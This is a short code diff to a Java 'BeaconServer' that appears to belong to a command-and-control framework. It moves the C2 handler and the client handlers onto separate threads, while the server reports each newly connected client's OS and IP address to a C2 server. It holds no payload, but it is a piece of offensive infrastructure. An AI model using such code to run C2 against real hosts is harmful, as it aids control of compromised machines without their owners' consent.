@@ -195,7 +195,8 @@ public class BeaconServer implements Runnable{
     @Override
     public void run(){
         // Start the thread that interacts with the C2 Server
-        C2Handler.run();
+        Thread C2HandlerThread = new Thread(C2Handler);
+        C2HandlerThread.start();
         // Always listening for clients
         while(true){
             try{
@@ -209,6 +210,8 @@ public class BeaconServer implements Runnable{
                 C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
                 // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
                 BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this);
+                Thread clientHandlerThread = new Thread(clientHandler);
+                clientHandlerThread.start();
                 // Add to client lists
                 if(OSMessage.equals("Windows")){
                     windowsClientObjects.put(IPAddress,clientHandler);
